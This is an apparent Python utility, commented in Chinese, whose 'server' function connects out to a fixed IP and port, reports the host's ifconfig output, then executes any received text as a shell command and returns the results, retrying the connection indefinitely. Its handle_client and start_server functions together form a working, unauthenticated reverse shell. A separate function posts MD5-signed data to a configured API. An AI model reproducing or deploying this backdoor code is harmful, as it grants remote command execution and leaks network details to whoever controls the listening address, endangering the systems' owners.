import socket
import subprocess
import threading
import requests
import hashlib
import time
import select
from constants import SALT, API_URL
from tools import log_with_timestamp


# 生成签名函数
def generate_sign(data: dict, salt: str) -> str:
    sorted_items = sorted(data.items())
    sign_string = "&".join(f"{key}={value}" for key, value in sorted_items)
    sign_string += f"&salt={salt}"
    return hashlib.md5(sign_string.encode('utf-8')).hexdigest()


# 发送给客户端的消息（包括当前时间和 ifconfig 信息）
def send_syn_message(client_socket):
    # 获取当前时间
    current_time = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
    
    # 获取 ifconfig 信息
    ifconfig_result = subprocess.run('ifconfig', shell=True, capture_output=True, text=True).stdout
    
    # 发送 SYN 消息，包括当前时间和 ifconfig 信息
    syn_message = f"SYN: 当前时间: {current_time}\n\nifconfig 输出:\n{ifconfig_result}\n"
    client_socket.send(syn_message.encode('utf-8'))
    log_with_timestamp(f"已发送 SYN 消息:\n{syn_message}")

def handle_client(client_socket):
    try:
        # 先发送 SYN 消息
        send_syn_message(client_socket)

        # 接收客户端的 ACK 消息
        ack_message = client_socket.recv(1024).decode('utf-8')
        log_with_timestamp(f"接收到 ACK 消息: {ack_message}")

        # 进入命令交互阶段
        while True:
            # 使用 select 进行非阻塞读取
            ready_to_read, _, _ = select.select([client_socket], [], [], 5)  # 5秒超时

            if ready_to_read:
                # 接收客户端发送的命令
                command = client_socket.recv(1024).decode('utf-8')
                log_with_timestamp(f"接收到命令: {command}")

                if not command:
                    # 客户端关闭连接的情况
                    log_with_timestamp("客户端关闭了连接")
                    break

                # 执行命令并返回结果
                result = subprocess.run(command, shell=True, capture_output=True, text=True)
                response = result.stdout + "\n" + result.stderr

                # 发送结果回客户端
                client_socket.send(response.encode('utf-8'))
            else:
                # 如果没有数据可读，继续等待
                log_with_timestamp("没有接收到命令，继续等待...")
                continue  # 等待下一次

    except Exception as e:
        log_with_timestamp(f"处理客户端时发生错误: {str(e)}")
        client_socket.send(f"Error: {str(e)}".encode('utf-8'))
        raise e  # 重新抛出异常以便重试
    finally:
        client_socket.close()


# 启动服务器
def start_server(host='0.0.0.0', port=9999, client_ip='10.128.51.10', max_syn_retries=5, syn_timeout=3):
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(1)
    log_with_timestamp(f"服务端已启动，监听 {host}:{port}...")

    retries = 0
    while True:
        try:
            log_with_timestamp(f"等待客户端连接...")
            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client_socket.connect((client_ip, port))

            # 设置超时时间和重试次数
            client_socket.settimeout(syn_timeout)

            # 处理客户端交互
            client_handler = threading.Thread(target=handle_client, args=(client_socket,))
            client_handler.start()
            client_handler.join()  # 等待线程结束

        except socket.timeout:
            retries += 1
            log_with_timestamp(f"超时未收到 ACK，重新尝试连接 ({retries}/{max_syn_retries})...")
            # if retries >= max_syn_retries:
            #     log_with_timestamp("超过最大重试次数，无法建立连接。退出程序。")
            #     break
        except Exception as e:
            log_with_timestamp(f"连接或交互失败: {str(e)}。正在重新建立连接...")
        finally:
            # 确保关闭旧的连接套接字
            try:
                client_socket.close()
            except Exception:
                pass

            retries += 1
            # if retries >= max_syn_retries:
            #     log_with_timestamp("超过最大重试次数，无法建立连接。退出程序。")
            #     break

            time.sleep(2)  # 短暂等待后重试连接

# 推送数据函数
def push_data(payload: dict, max_retry: int, retry_interval: int):
    retry_count = 0
    success = False

    while retry_count <= max_retry:
        payload['timestamp'] = int(time.time())
        payload['retry'] = retry_count
        payload['sign'] = generate_sign(payload, SALT)

        log_with_timestamp(f"\033[93m推送到地址: {API_URL}\033[0m")

        try:
            response = requests.post(API_URL, json=payload)
            log_with_timestamp(f"\033[93m状态码: {response.status_code}\033[0m")
            log_with_timestamp(f"\033[93m响应内容: {response.text}\033[0m")

            if response.status_code == 200:
                log_with_timestamp("\033[92m推送成功\033[0m")
                success = True
                break
            else:
                log_with_timestamp(f"\033[91m推送失败，状态码: {response.status_code}, 内容: {response.text}\033[0m")
        except requests.RequestException as e:
            log_with_timestamp(f"\033[91m请求异常: {e}\033[0m")

        retry_count += 1
        if retry_count <= max_retry:
            log_with_timestamp(f"\033[93m重试 {retry_count}/{max_retry} 次，等待 {retry_interval} 秒...\033[0m")
            time.sleep(retry_interval)

    if not success:
        log_with_timestamp("\033[91m推送失败，达到最大重传次数。\033[0m")

